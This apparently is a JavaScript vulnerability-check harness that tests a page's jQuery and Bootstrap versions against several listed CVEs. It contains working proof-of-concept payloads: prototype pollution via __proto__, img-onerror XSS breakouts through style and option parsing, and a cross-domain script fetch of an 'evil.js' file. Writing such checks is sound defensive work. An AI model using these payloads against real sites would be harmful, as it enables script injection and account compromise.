// Exploit checks for BPJS 2.4: each test marks VULNERABLE only if its payload actually runs.
var R = {}, KEYS = ['CVE-2019-11358', 'CVE-2020-11022', 'CVE-2020-11023', 'jQuery-11974', 'CVE-2015-9251', 'CVE-2024-6485'];
KEYS.forEach(function (k) { R[k] = 'safe'; });
window.hit = function (k) { R[k] = 'VULNERABLE'; };
function run(k, fn) { try { fn(); } catch (e) { R[k + ' error'] = String(e); } }

run('versions', function () { R.jquery = jQuery.fn.jquery; R.bootstrap = $.fn.tooltip.Constructor.VERSION; });
run('CVE-2019-11358', function () {
  $.extend(true, {}, JSON.parse('{"__proto__":{"polluted":"yes"}}'));
  if (({}).polluted === 'yes') R['CVE-2019-11358'] = 'VULNERABLE';
  delete Object.prototype.polluted;
});
run('CVE-2020-11022', function () { $('<div>').appendTo('body').html('<style><style/><img src=x onerror=hit("CVE-2020-11022")>'); });
run('CVE-2020-11023', function () { $('<div>').appendTo('body').html('<option><style></option></select><img src=x onerror=hit("CVE-2020-11023")></style>'); });
run('jQuery-11974', function () { $.parseHTML('<img src=x onerror=hit("jQuery-11974")>'); });
run('CVE-2015-9251', function () { $.ajax({ url: 'http://127.0.0.1:8765/evil.js' }); });
run('CVE-2024-6485', function () {
  $('<button data-loading-text="<img src=x onerror=hit(\'CVE-2024-6485\')>">x</button>').appendTo('body').button('loading');
});

setTimeout(function () {
  var pre = document.createElement('pre'); pre.id = 'result';
  pre.textContent = JSON.stringify(R, null, 2); document.body.appendChild(pre);
}, 2500);
